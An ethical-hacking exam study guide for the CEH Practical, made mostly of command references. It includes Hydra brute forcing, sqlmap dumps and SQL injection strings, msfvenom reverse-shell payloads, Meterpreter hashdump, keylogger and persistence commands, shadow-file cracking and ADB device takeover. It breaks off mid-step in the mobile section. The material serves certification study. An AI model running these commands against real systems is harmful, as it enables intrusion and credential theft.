# 🎯 CEH Practical Exam Study Playbook

[![Certification](https://img.shields.io/badge/Certification-CEH%20Practical-red)]()
[![EC-Council](https://img.shields.io/badge/EC--Council-v13-blue)]()
[![Exam Duration](https://img.shields.io/badge/Duration-6%20Hours-orange)]()
[![Questions](https://img.shields.io/badge/Questions-20-green)]()

> **Complete hands-on preparation guide for the EC-Council Certified Ethical Hacker (CEH) Practical Examination**

---

## 📋 Table of Contents

<details>
<summary>Click to expand</summary>

1. [Exam Overview](#-exam-overview)
2. [Quick Reference Cheat Sheet](#-quick-reference-cheat-sheet)
3. [Exam Environment](#-exam-environment)
4. [Network Scanning & Enumeration](#-network-scanning--enumeration)
5. [Password Cracking](#-password-cracking)
6. [Web Application Attacks](#-web-application-attacks)
7. [SQL Injection](#-sql-injection)
8. [Steganography](#-steganography)
9. [Cryptography](#-cryptography)
10. [Wireshark & Packet Analysis](#-wireshark--packet-analysis)
11. [System Hacking & Exploitation](#-system-hacking--exploitation)
12. [Mobile Platform Hacking](#-mobile-platform-hacking)
13. [Wireless Network Hacking](#-wireless-network-hacking)
14. [Malware Analysis](#-malware-analysis)
15. [Common Exam Questions](#-common-exam-questions)
16. [Exam Strategy & Tips](#-exam-strategy--tips)
17. [Practice Labs & Resources](#-practice-labs--resources)

</details>

---

## 📊 Exam Overview

### Exam Details

| Attribute | Details |
|-----------|---------|
| **Exam Code** | CEH Practical |
| **Duration** | 6 hours (includes 15-minute break) |
| **Number of Questions** | 20 practical challenges |
| **Passing Score** | 70% (minimum 14 correct) |
| **Format** | Hands-on, proctored, browser-based (iLab) |
| **Open Book** | Yes (Google allowed, no communication) |
| **Cost** | $550 USD |
| **Validity** | 3 years |
| **Retake** | Discounted voucher available |

### Skills Tested

```
┌─────────────────────────────────────────────────────────────────┐
│                    CEH PRACTICAL DOMAINS                        │
├─────────────────────────────────────────────────────────────────┤
│  ▸ Network Scanning & Enumeration                               │
│  ▸ Vulnerability Analysis                                       │
│  ▸ System Hacking & Exploitation                                │
│  ▸ Web Application Attacks (SQLi, XSS, Parameter Tampering)     │
│  ▸ Password Cracking & Brute-forcing                            │
│  ▸ Steganography & Steganalysis                                 │
│  ▸ Cryptography Attacks                                         │
│  ▸ Packet Sniffing & Analysis                                   │
│  ▸ Mobile Platform Hacking                                      │
│  ▸ Wireless Network Attacks                                     │
│  ▸ Malware Analysis & Reverse Engineering                       │
│  ▸ Social Engineering Techniques                                │
└─────────────────────────────────────────────────────────────────┘
```

### Answer Format Hints

**IMPORTANT**: Pay attention to answer format hints in questions:
- `AA` = 2 Capital letters
- `aa` = 2 lowercase letters
- `NN` or `00` = 2 numbers
- `**` = 2 special characters
- Example: `AAaa00**` = Password format like `ABcd12!@`

---

## ⚡ Quick Reference Cheat Sheet

### 🔍 Network Discovery

```bash
# Host Discovery
nmap -sn 192.168.1.0/24                    # Ping sweep
nmap -sn 192.168.1.0/24 -oN hosts.txt      # Save live hosts
netdiscover -i eth0                         # ARP-based discovery

# Port Scanning
nmap -sS -sV -O 192.168.1.10               # SYN scan + version + OS
nmap -sC -sV -sS -p- 192.168.1.10          # Full scan with scripts
nmap -Pn -p 21,22,80,443,3389 192.168.1.10 # Specific ports

# Service-Specific Scans
nmap -Pn -p 21 192.168.1.0/24 | grep -B 5 open    # FTP hosts
nmap -Pn -p 3389 192.168.1.0/24 | grep -B 5 open  # RDP hosts
nmap -Pn -p 3306 192.168.1.0/24 | grep -B 5 open  # MySQL hosts
nmap -Pn -p 445 192.168.1.0/24 | grep -B 5 open   # SMB hosts
```

### 🔐 Password Cracking

```bash
# Hydra - Brute Force
hydra -l admin -P /path/wordlist.txt ftp://192.168.1.10
hydra -L users.txt -P passwords.txt ssh://192.168.1.10
hydra -l admin -P wordlist.txt 192.168.1.10 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# John The Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --format=raw-md5 --wordlist=wordlist.txt hash.txt
john --show hash.txt

# Hashcat
hashcat -m 0 hash.txt wordlist.txt         # MD5
hashcat -m 1000 hash.txt wordlist.txt      # NTLM
hashcat -m 1800 hash.txt wordlist.txt      # SHA-512
```

### 💉 SQL Injection

```bash
# SQLMap Basics
sqlmap -u "http://target.com/page.php?id=1" --dbs
sqlmap -u "http://target.com/page.php?id=1" -D database --tables
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump

# With Cookie
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123" --dbs
```

### 🖼️ Steganography

```bash
# Linux Tools
steghide extract -sf image.jpg             # Extract hidden data
steghide embed -cf image.jpg -ef secret.txt # Hide data

# Windows Tools (GUI)
OpenStego                                   # Hide/Extract data
Snow                                        # Whitespace steganography
```

### 🔒 Cryptography

```bash
# Hash Calculation
md5sum file.txt                            # MD5 hash
sha1sum file.txt                           # SHA1 hash
sha256sum file.txt                         # SHA256 hash

# VeraCrypt - Mount encrypted volume
veracrypt --mount /path/volume /mount/point

# CryptTool (Windows) - GUI for encryption/decryption
```

### 📊 Wireshark Filters

```bash
# Common Filters
ip.addr == 192.168.1.10                    # Specific IP
tcp.port == 80                             # HTTP traffic
http.request.method == "POST"              # POST requests
ftp                                         # FTP traffic
tcp.flags.syn == 1                         # SYN packets
dns                                         # DNS queries
```

---

## 🖥️ Exam Environment

### Virtual Machines Provided

```
┌────────────────────────────────────────────────────────────┐
│                    EXAM ENVIRONMENT                         │
├────────────────────────────────────────────────────────────┤
│                                                             │
│   ┌─────────────────┐       ┌─────────────────┐            │
│   │   PARROT OS     │       │  WINDOWS 11/    │            │
│   │  (Attack Box)   │       │  SERVER 2016    │            │
│   │                 │       │                 │            │
│   │ • Nmap          │       │ • OpenStego     │            │
│   │ • Metasploit    │       │ • VeraCrypt     │            │
│   │ • SQLMap        │       │ • CryptTool     │            │
│   │ • Hydra         │       │ • Wireshark     │            │
│   │ • Wireshark     │       │ • HashCalc      │            │
│   │ • WPScan        │       │ • SNOW          │            │
│   │ • John/Hashcat  │       │ • BCTextEncoder │            │
│   └─────────────────┘       └─────────────────┘            │
│                                                             │
│              ↓ Target Network (5 machines) ↓               │
│   ┌─────┐ ┌─────┐ ┌─────┐ ┌─────┐ ┌─────┐                 │
│   │ VM1 │ │ VM2 │ │ VM3 │ │ VM4 │ │ VM5 │                 │
│   └─────┘ └─────┘ └─────┘ └─────┘ └─────┘                 │
│                                                             │
└────────────────────────────────────────────────────────────┘
```

### Key Locations

| Item | Location |
|------|----------|
| **Wordlists** | `/root/Desktop/wordlists/` or `/usr/share/wordlists/` |
| **Tools** | Parrot menu or `/usr/bin/` |
| **User/Pass files** | Usually on Desktop |
| **PCAP files** | Desktop or specified in question |

### First Steps in Exam

```bash
# 1. Discover network subnets and live hosts
nmap -sn 10.10.10.0/24 -oN hosts_10.txt
nmap -sn 172.16.0.0/24 -oN hosts_172.txt
nmap -sn 192.168.0.0/24 -oN hosts_192.txt

# 2. Full port scan on discovered hosts
nmap -sC -sV -sS -O -p- 10.10.10.10 -oN full_scan.txt

# 3. Save results for reference throughout exam
cat hosts_*.txt | grep "Nmap scan report" > all_hosts.txt
```

---

## 🔍 Network Scanning & Enumeration

### Nmap - Complete Reference

#### Host Discovery

```bash
# Basic host discovery
nmap -sn 192.168.1.0/24                    # Ping sweep (no port scan)
nmap -sn -PE 192.168.1.0/24                # ICMP echo
nmap -sn -PS22,80,443 192.168.1.0/24       # TCP SYN ping
nmap -sn -PA22,80,443 192.168.1.0/24       # TCP ACK ping
nmap -sn -PU53,161 192.168.1.0/24          # UDP ping

# List scan (no packets sent)
nmap -sL 192.168.1.0/24
```

#### Port Scanning Techniques

```bash
# TCP Scans
nmap -sS 192.168.1.10                      # SYN scan (stealth)
nmap -sT 192.168.1.10                      # TCP connect scan
nmap -sA 192.168.1.10                      # ACK scan (firewall detection)
nmap -sW 192.168.1.10                      # Window scan
nmap -sN 192.168.1.10                      # NULL scan
nmap -sF 192.168.1.10                      # FIN scan
nmap -sX 192.168.1.10                      # Xmas scan

# UDP Scan
nmap -sU 192.168.1.10                      # UDP scan
nmap -sU -p 53,161,162 192.168.1.10        # Specific UDP ports

# Combined Scans
nmap -sS -sU -p T:1-1000,U:53,161 192.168.1.10
```

#### Service & Version Detection

```bash
# Version detection
nmap -sV 192.168.1.10                      # Service versions
nmap -sV --version-intensity 5 192.168.1.10 # More aggressive

# OS Detection
nmap -O 192.168.1.10                       # OS fingerprinting
nmap -O --osscan-guess 192.168.1.10        # Aggressive OS guess

# Combined comprehensive scan
nmap -sS -sV -O -sC 192.168.1.10           # Full enumeration
nmap -A 192.168.1.10                       # Aggressive (same as above)
```

#### Nmap Scripting Engine (NSE)

```bash
# Script categories
nmap --script=default 192.168.1.10         # Default scripts
nmap --script=vuln 192.168.1.10            # Vulnerability scripts
nmap --script=safe 192.168.1.10            # Safe scripts
nmap --script=exploit 192.168.1.10         # Exploit scripts

# Specific scripts
nmap --script=smb-enum-shares 192.168.1.10
nmap --script=smb-enum-users 192.168.1.10
nmap --script=smb-os-discovery 192.168.1.10
nmap --script=http-enum 192.168.1.10
nmap --script=ftp-anon 192.168.1.10
nmap --script=ssh-brute 192.168.1.10
nmap --script=mysql-enum 192.168.1.10

# Banner grabbing
nmap --script=banner 192.168.1.10

# Vulnerability scanning
nmap --script=vuln 192.168.1.10
nmap --script=smb-vuln-ms17-010 192.168.1.10  # EternalBlue
```

#### Output Formats

```bash
nmap -oN output.txt 192.168.1.10           # Normal output
nmap -oX output.xml 192.168.1.10           # XML output
nmap -oG output.gnmap 192.168.1.10         # Grepable output
nmap -oA output 192.168.1.10               # All formats
```

### SMB Enumeration

```bash
# Using Nmap
nmap -p 445 --script=smb-enum-shares 192.168.1.10
nmap -p 445 --script=smb-enum-users 192.168.1.10
nmap -p 445 --script=smb-os-discovery 192.168.1.10
nmap -p 445 --script=smb-enum-groups --script-args smbusername=admin,smbpassword=pass123 192.168.1.10

# Using smbclient
smbclient -L //192.168.1.10                # List shares (anonymous)
smbclient -L //192.168.1.10 -U username    # List shares (authenticated)
smbclient //192.168.1.10/sharename         # Connect to share
smbclient //192.168.1.10/sharename -U username

# SMB Commands (after connecting)
ls                                          # List files
get filename                                # Download file
put filename                                # Upload file
cd directory                                # Change directory

# Using enum4linux
enum4linux -a 192.168.1.10                 # Full enumeration
enum4linux -U 192.168.1.10                 # Users
enum4linux -S 192.168.1.10                 # Shares
```

### FTP Enumeration

```bash
# Check for anonymous login
nmap --script=ftp-anon 192.168.1.10

# Manual FTP connection
ftp 192.168.1.10
> anonymous                                 # Try anonymous login
> anonymous@example.com                     # Password

# FTP commands
ls                                          # List files
get filename                                # Download
put filename                                # Upload
binary                                      # Binary mode
ascii                                       # ASCII mode
```

### RDP Enumeration

```bash
# Find RDP hosts
nmap -Pn -p 3389 192.168.1.0/24 | grep -B 5 open

# RDP Scanner (Metasploit)
msfconsole
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS 192.168.1.0/24
run

# Connect to RDP
xfreerdp /u:username /p:password /v:192.168.1.10:3389
rdesktop 192.168.1.10
```

### NetBIOS Enumeration

```bash
# Nmap NetBIOS scripts
nmap -sU -p 137 --script=nbstat 192.168.1.10

# nbtscan
nbtscan 192.168.1.0/24
nbtscan -r 192.168.1.0/24                  # Recursive

# nmblookup
nmblookup -A 192.168.1.10
```

---

## 🔐 Password Cracking

### Hydra - Network Brute Force

#### Supported Protocols

```bash
# FTP
hydra -l admin -P wordlist.txt ftp://192.168.1.10
hydra -L users.txt -P passwords.txt 192.168.1.10 ftp

# SSH
hydra -l root -P wordlist.txt ssh://192.168.1.10
hydra -l root -P wordlist.txt 192.168.1.10 ssh -s 2222  # Custom port

# Telnet
hydra -l admin -P wordlist.txt telnet://192.168.1.10

# RDP
hydra -l administrator -P wordlist.txt rdp://192.168.1.10

# SMB
hydra -l admin -P wordlist.txt smb://192.168.1.10

# MySQL
hydra -l root -P wordlist.txt mysql://192.168.1.10

# HTTP Basic Auth
hydra -l admin -P wordlist.txt http-get://192.168.1.10/admin

# HTTP POST Form
hydra -l admin -P wordlist.txt 192.168.1.10 http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid"

# Options
-l LOGIN         # Single username
-L FILE          # Username list
-p PASS          # Single password
-P FILE          # Password list
-t TASKS         # Parallel connections (default: 16)
-s PORT          # Custom port
-V               # Verbose
-f               # Stop on first success
```

### John The Ripper

#### Hash Cracking

```bash
# Identify hash type
john --list=formats | grep -i md5

# Crack MD5
john --format=raw-md5 --wordlist=wordlist.txt hash.txt

# Crack SHA1
john --format=raw-sha1 --wordlist=wordlist.txt hash.txt

# Crack SHA256
john --format=raw-sha256 --wordlist=wordlist.txt hash.txt

# Crack SHA512
john --format=raw-sha512 --wordlist=wordlist.txt hash.txt

# Crack NTLM (Windows)
john --format=nt --wordlist=wordlist.txt hash.txt

# Crack Linux shadow
john --wordlist=wordlist.txt shadow.txt

# Show cracked passwords
john --show hash.txt

# Incremental mode (brute force)
john --incremental hash.txt

# Rules-based attack
john --wordlist=wordlist.txt --rules hash.txt
```

#### Unshadow (Linux Passwords)

```bash
# Combine passwd and shadow files
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john --wordlist=rockyou.txt unshadowed.txt
```

### Hashcat

#### Common Hash Modes

| Mode | Hash Type |
|------|-----------|
| 0 | MD5 |
| 100 | SHA1 |
| 1400 | SHA256 |
| 1700 | SHA512 |
| 1000 | NTLM |
| 1800 | SHA512crypt ($6$) |
| 3200 | bcrypt |
| 500 | MD5crypt ($1$) |

```bash
# Basic syntax
hashcat -m <mode> hash.txt wordlist.txt

# MD5
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# NTLM
hashcat -m 1000 hash.txt wordlist.txt

# SHA256
hashcat -m 1400 hash.txt wordlist.txt

# With rules
hashcat -m 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Show results
hashcat -m 0 hash.txt --show

# Attack modes
-a 0    # Dictionary attack
-a 1    # Combination attack
-a 3    # Brute-force
-a 6    # Hybrid (wordlist + mask)
-a 7    # Hybrid (mask + wordlist)
```

### Hash Identification

```bash
# Using hash-identifier
hash-identifier
> <paste hash>

# Using hashid
hashid <hash>
hashid -m <hash>                           # Show hashcat mode

# Online tools
# https://hashes.com/en/tools/hash_identifier
# https://www.tunnelsup.com/hash-analyzer/
```

### Windows Tools

#### HashCalc (GUI)
- Calculate MD5, SHA1, SHA256, SHA512
- Compare file hashes
- Verify file integrity

#### MD5 Calculator
- Right-click file → Compare hash
- Quick hash verification

---

## 🌐 Web Application Attacks

### Directory Enumeration

```bash
# Dirb
dirb http://192.168.1.10/
dirb http://192.168.1.10/ /usr/share/wordlists/dirb/common.txt
dirb http://192.168.1.10/ -o results.txt

# Gobuster
gobuster dir -u http://192.168.1.10/ -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://192.168.1.10/ -w wordlist.txt -x php,html,txt

# Dirbuster (GUI)
dirbuster
```

### Nikto - Web Server Scanner

```bash
# Basic scan
nikto -h http://192.168.1.10

# Scan with SSL
nikto -h https://192.168.1.10 -ssl

# Scan specific port
nikto -h http://192.168.1.10:8080

# Output to file
nikto -h http://192.168.1.10 -o results.txt
```

### WPScan - WordPress Scanner

```bash
# Basic scan
wpscan --url http://192.168.1.10/wordpress/

# Enumerate users
wpscan --url http://192.168.1.10/wordpress/ --enumerate u

# Enumerate plugins
wpscan --url http://192.168.1.10/wordpress/ --enumerate p

# Enumerate themes
wpscan --url http://192.168.1.10/wordpress/ --enumerate t

# Full enumeration
wpscan --url http://192.168.1.10/wordpress/ --enumerate u,p,t

# Password brute force
wpscan --url http://192.168.1.10/wordpress/ -U admin -P /path/wordlist.txt
wpscan --url http://192.168.1.10:8080/CEH/ --enumerate u -P /root/Desktop/wordlists/passwords.txt

# With API token (for vulnerability data)
wpscan --url http://192.168.1.10/wordpress/ --api-token YOUR_TOKEN --enumerate vp
```

### OWASP ZAP

```bash
# Start ZAP
zaproxy &

# Key features:
# - Automated Scanner
# - Spider (crawler)
# - Fuzzer
# - Intercepting proxy
# - Active/Passive scanning

# Quick scan workflow:
# 1. Set target URL
# 2. Spider the site
# 3. Run active scan
# 4. Review alerts
```

### Burp Suite

```bash
# Start Burp Suite
burpsuite &

# Key features for CEH:
# - Intercept requests
# - Modify parameters
# - Intruder (brute force)
# - Repeater (manual testing)

# Intruder attack:
# 1. Capture login request
# 2. Send to Intruder
# 3. Mark payload positions
# 4. Load wordlist
# 5. Start attack
```

### Parameter Tampering

```bash
# Common techniques:
# 1. Modify URL parameters
http://target.com/page.php?id=1   → http://target.com/page.php?id=2

# 2. Hidden form fields
<input type="hidden" name="price" value="100">
# Change value="100" to value="1"

# 3. Cookie manipulation
# Use browser dev tools or Burp Suite

# 4. HTTP header manipulation
# Modify User-Agent, Referer, X-Forwarded-For
```

---

## 💉 SQL Injection

### SQLMap - Complete Reference

#### Basic Usage

```bash
# Test for SQL injection
sqlmap -u "http://target.com/page.php?id=1"

# Get databases
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Get tables from database
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables

# Get columns from table
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --columns

# Dump table data
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --dump

# Dump specific columns
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users -C username,password --dump
```

#### With Authentication

```bash
# With cookie
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123; security=low" --dbs

# With login
sqlmap -u "http://target.com/page.php?id=1" --auth-type=basic --auth-cred="user:pass"

# From request file (Burp)
sqlmap -r request.txt --dbs
```

#### POST Data Injection

```bash
# POST parameter
sqlmap -u "http://target.com/login.php" --data="username=admin&password=test" --dbs

# Specify injection point
sqlmap -u "http://target.com/login.php" --data="username=admin&password=test" -p username --dbs
```

#### Advanced Options

```bash
# Increase level and risk
sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3 --dbs

# Specific DBMS
sqlmap -u "http://target.com/page.php?id=1" --dbms=mysql --dbs

# OS shell (if privileges allow)
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# SQL shell
sqlmap -u "http://target.com/page.php?id=1" --sql-shell

# Batch mode (no prompts)
sqlmap -u "http://target.com/page.php?id=1" --batch --dbs

# Threads for speed
sqlmap -u "http://target.com/page.php?id=1" --threads=10 --dbs
```

#### Common Exam Scenario

```bash
# Full extraction workflow
# Step 1: Find databases
sqlmap -u "http://192.168.1.10/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=abc123; security=low" --dbs

# Step 2: Get tables
sqlmap -u "http://192.168.1.10/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=abc123; security=low" -D dvwa --tables

# Step 3: Get users table
sqlmap -u "http://192.168.1.10/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=abc123; security=low" -D dvwa -T users --dump
```

### Manual SQL Injection

```sql
-- Test for injection
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
" OR "1"="1
') OR ('1'='1

-- Union-based injection
' UNION SELECT 1,2,3--
' UNION SELECT null,null,null--
' UNION SELECT username,password,null FROM users--

-- Error-based injection
' AND 1=CONVERT(int,(SELECT TOP 1 username FROM users))--

-- Time-based blind injection
'; IF (1=1) WAITFOR DELAY '0:0:5'--
' AND SLEEP(5)--
```

---

## 🖼️ Steganography

### Steghide (Linux)

```bash
# Extract hidden data
steghide extract -sf image.jpg
# Enter passphrase when prompted

# Extract with password
steghide extract -sf image.jpg -p password

# Hide data in image
steghide embed -cf cover.jpg -ef secret.txt
steghide embed -cf cover.jpg -ef secret.txt -p password

# Get info about file
steghide info image.jpg
```

### OpenStego (Windows/Linux GUI)

```
1. Open OpenStego
2. Select "Extract Data"
3. Browse to stego file (image)
4. Enter password if required
5. Choose output location
6. Click "Extract Data"

For hiding:
1. Select "Hide Data"
2. Choose message file
3. Choose cover file (image)
4. Set output filename
5. Enter password (optional)
6. Click "Hide Data"
```

### Snow (Windows) - Whitespace Steganography

```bash
# Extract hidden message
Snow.exe -C -p "password" filename.txt

# Hide message
Snow.exe -C -m "secret message" -p "password" input.txt output.txt

# Common exam usage:
Snow.exe -C -p "password" message.txt
```

### QuickStego (Windows)

```
1. Open QuickStego
2. Open image file
3. Hidden text appears automatically
4. Or enter text to hide and save
```

### Identifying Steganography

```bash
# Check file for hidden content
file image.jpg
strings image.jpg
binwalk image.jpg
exiftool image.jpg

# Compare file sizes
ls -la original.jpg stego.jpg
```

---

## 🔒 Cryptography

### Hash Calculation

```bash
# Linux commands
md5sum file.txt                            # MD5
sha1sum file.txt                           # SHA1
sha256sum file.txt                         # SHA256
sha512sum file.txt                         # SHA512

# Create hash from string
echo -n "password" | md5sum
echo -n "password" | sha256sum

# Verify hash
md5sum -c hashfile.md5
sha256sum -c hashfile.sha256
```

### HashCalc (Windows)

```
1. Open HashCalc
2. Select "File" or "Text String"
3. Browse to file or enter text
4. Select hash algorithms
5. Click "Calculate"
6. Compare with known hash
```

### VeraCrypt - Disk Encryption

```bash
# Mount encrypted volume (Linux)
veracrypt /path/to/volume /mnt/veracrypt

# Mount with password
veracrypt --text --password="mypassword" /path/to/volume /mnt/veracrypt

# Dismount
veracrypt -d /mnt/veracrypt

# List mounted volumes
veracrypt -l
```

**Windows (GUI):**
```
1. Open VeraCrypt
2. Select drive letter
3. Click "Select File" or "Select Device"
4. Browse to encrypted file
5. Click "Mount"
6. Enter password
7. Access mounted drive
```

### CryptTool (Windows)

```
Used for:
- Symmetric encryption (AES, DES, 3DES)
- Asymmetric encryption (RSA)
- Hash functions
- Digital signatures
- Cryptanalysis

Common exam tasks:
1. Decrypt 3DES encrypted text
2. Analyze encryption algorithms
3. Perform frequency analysis
```

### BCTextEncoder (Windows)

```
1. Open BCTextEncoder
2. Paste encoded text
3. Enter password
4. Click "Decode"
5. View decoded message
```

### Base64 Encoding/Decoding

```bash
# Encode
echo -n "text" | base64
base64 file.txt > encoded.txt

# Decode
echo "dGV4dA==" | base64 -d
base64 -d encoded.txt > decoded.txt
```

### Common Encryption Types

| Type | Characteristics |
|------|----------------|
| **MD5** | 32 hex characters |
| **SHA1** | 40 hex characters |
| **SHA256** | 64 hex characters |
| **SHA512** | 128 hex characters |
| **Base64** | A-Z, a-z, 0-9, +, /, = padding |
| **NTLM** | 32 hex characters (Windows) |

---

## 📊 Wireshark & Packet Analysis

### Common Display Filters

```bash
# IP Filtering
ip.addr == 192.168.1.10                    # Source or destination
ip.src == 192.168.1.10                     # Source only
ip.dst == 192.168.1.10                     # Destination only
ip.addr == 192.168.1.0/24                  # Subnet

# Port Filtering
tcp.port == 80                             # TCP port 80
udp.port == 53                             # UDP port 53
tcp.srcport == 443                         # Source port
tcp.dstport == 22                          # Destination port

# Protocol Filtering
http                                        # HTTP traffic
dns                                         # DNS traffic
ftp                                         # FTP traffic
ssh                                         # SSH traffic
telnet                                      # Telnet traffic
icmp                                        # ICMP traffic
arp                                         # ARP traffic
smtp                                        # SMTP (email)
pop                                         # POP3 (email)

# HTTP Specific
http.request                               # HTTP requests
http.response                              # HTTP responses
http.request.method == "GET"               # GET requests
http.request.method == "POST"              # POST requests
http.request.uri contains "login"          # URI contains login

# TCP Flags
tcp.flags.syn == 1                         # SYN packets
tcp.flags.ack == 1                         # ACK packets
tcp.flags.fin == 1                         # FIN packets
tcp.flags.reset == 1                       # RST packets

# Content Search
frame contains "password"                  # Search for string
http contains "admin"                      # Search in HTTP

# Combining Filters
ip.addr == 192.168.1.10 && tcp.port == 80
http && ip.src == 192.168.1.10
(dns) || (http)
!(arp)                                     # Exclude ARP
```

### Exam-Specific Tasks

#### Find Credentials

```bash
# HTTP POST credentials
http.request.method == "POST"
# Follow TCP Stream → Look for username/password

# FTP credentials
ftp
# Look for USER and PASS commands

# Telnet credentials
telnet
# Follow TCP Stream
```

#### Identify DDoS Attack

```bash
# Look for high volume from single IP
Statistics → Conversations → Sort by packets

# SYN flood
tcp.flags.syn == 1 && tcp.flags.ack == 0

# Common DDoS indicators:
# - Many SYN packets, few ACK
# - Single source, many destinations
# - High packet rate
```

#### Covert TCP Analysis

```bash
# Analyze Identification field for hidden data
# Look at IP ID field in hex
# Convert hex values to ASCII

# Filter for specific communication
ip.addr == 10.10.10.9 && ip.addr == 10.10.10.13
```

#### Traffic Analysis

```bash
# Statistics → Protocol Hierarchy
# Statistics → Conversations
# Statistics → Endpoints
# Statistics → I/O Graph

# Find top talkers
Statistics → Conversations → IPv4 → Sort by Bytes

# Identify port traffic
Statistics → Conversations → TCP
```

#### Extract Files

```bash
# File → Export Objects → HTTP
# File → Export Objects → SMB
# File → Export Objects → TFTP

# For TCP streams
# Right-click packet → Follow → TCP Stream
# Save as raw data
```

### tcpdump (Linux Alternative)

```bash
# Capture traffic
tcpdump -i eth0
tcpdump -i eth0 -w capture.pcap

# Read capture file
tcpdump -r capture.pcap

# Filter by host
tcpdump -i eth0 host 192.168.1.10

# Filter by port
tcpdump -i eth0 port 80

# Filter by protocol
tcpdump -i eth0 tcp
tcpdump -i eth0 udp
tcpdump -i eth0 icmp
```

---

## 💻 System Hacking & Exploitation

### Metasploit Framework

#### Basic Commands

```bash
# Start Metasploit
msfdb init && msfconsole

# Search for exploits
search type:exploit name:smb
search type:auxiliary name:scanner
search cve:2017-0144

# Use module
use exploit/windows/smb/ms17_010_eternalblue
use auxiliary/scanner/smb/smb_version

# Show options
show options
show payloads
show targets

# Set options
set RHOSTS 192.168.1.10
set RHOST 192.168.1.10
set LHOST 192.168.1.5
set LPORT 4444
set payload windows/meterpreter/reverse_tcp

# Run
exploit
run
```

#### Common Modules

```bash
# SMB Scanning
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/smb_enumusers
use auxiliary/scanner/smb/smb_login

# RDP Scanning
use auxiliary/scanner/rdp/rdp_scanner

# FTP
use auxiliary/scanner/ftp/ftp_login
use auxiliary/scanner/ftp/anonymous

# SSH
use auxiliary/scanner/ssh/ssh_login

# HTTP
use auxiliary/scanner/http/http_version
use auxiliary/scanner/http/wordpress_login_enum

# MySQL
use auxiliary/scanner/mysql/mysql_login
use auxiliary/scanner/mysql/mysql_version
```

#### WordPress Brute Force with Metasploit

```bash
msfconsole
use auxiliary/scanner/http/wordpress_login_enum
set RHOSTS 192.168.1.10
set RPORT 8080
set TARGETURI /CEH/
set USERNAME admin
set PASS_FILE /root/Desktop/wordlists/passwords.txt
run
```

#### Creating Payloads with msfvenom

```bash
# Windows reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o shell.exe

# Linux reverse shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f elf -o shell.elf

# PHP reverse shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o shell.php

# Handler setup
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
exploit
```

#### Meterpreter Commands

```bash
# System information
sysinfo
getuid
getpid

# File operations
pwd
ls
cd C:\\
download file.txt
upload shell.exe

# Privilege escalation
getsystem
getprivs

# Hash dumping
hashdump

# Network
ifconfig
netstat
route

# Process
ps
migrate <PID>
kill <PID>

# Persistence
run persistence -h

# Screenshot
screenshot

# Keylogger
keyscan_start
keyscan_dump
keyscan_stop
```

### Remote Access

```bash
# RDP Connection
xfreerdp /u:administrator /p:password123 /v:192.168.1.10:3389
rdesktop 192.168.1.10

# SSH
ssh user@192.168.1.10
ssh -p 2222 user@192.168.1.10

# Telnet
telnet 192.168.1.10
```

### Privilege Escalation

```bash
# Linux
sudo -l                                    # List sudo privileges
find / -perm -4000 2>/dev/null            # SUID binaries
cat /etc/crontab                          # Cron jobs
uname -a                                   # Kernel version

# Check GTFOBins for exploitation
# https://gtfobins.github.io/

# Windows
whoami /priv                              # Current privileges
systeminfo                                 # System info
net user                                   # List users
net localgroup administrators             # Admin group members
```

### Common Malware Ports

```
┌─────────────────────────────────────────────┐
│         COMMON RAT/TROJAN PORTS             │
├─────────────────────────────────────────────┤
│  Port 5552   - njRAT                        │
│  Port 5110   - ProRAT                       │
│  Port 6703   - Theef                        │
│  Port 9871   - Theef                        │
│  Port 1234   - SubSeven                     │
│  Port 4444   - Metasploit default           │
│  Port 5555   - Android Debug Bridge (ADB)   │
└─────────────────────────────────────────────┘
```

---

## 📱 Mobile Platform Hacking

### Android Hacking with ADB

```bash
# Connect to device
adb connect 192.168.1.20:5555

# List connected devices
adb devices

# Get shell
adb shell

# File operations
adb pull /sdcard/file.txt /local/path/     # Download from device
adb push /local/file.txt /sdcard/          # Upload to device

# Install APK
adb install app.apk

# Uninstall app
adb uninstall com.package.name

# List packages
adb shell pm list packages

# Get device info
adb shell getprop

# Screenshot
adb shell screencap /sdcard/screen.png
adb pull /sdcard/screen.png

# Screen record
adb shell screenrecord /sdcard/video.mp4
```

### PhoneSploit (Automated ADB Exploitation)

```bash
# Clone and setup
git clone https://github.com/aerosol-can/PhoneSploit
cd PhoneSploit
pip3 install colorama
python3 -m pip install colorama

# Run
python3 phonesploit.py

# Menu options:
# 1. Connect device
# 2. Disconnect device
# 3. Get shell
# 4. Pull files
# 5. Push files
# 6. Install APK
# 7. Screen record
# 8. Screenshot
```

### Common Exam Scenario

```bash
# 1. Discover Android device (usually port 5555)
nmap -p 5555 192.168.1.0/24

# 2. Connect via ADB
adb connect 192.168.1.20:5555

# 3. Pull specific file (question will specify)
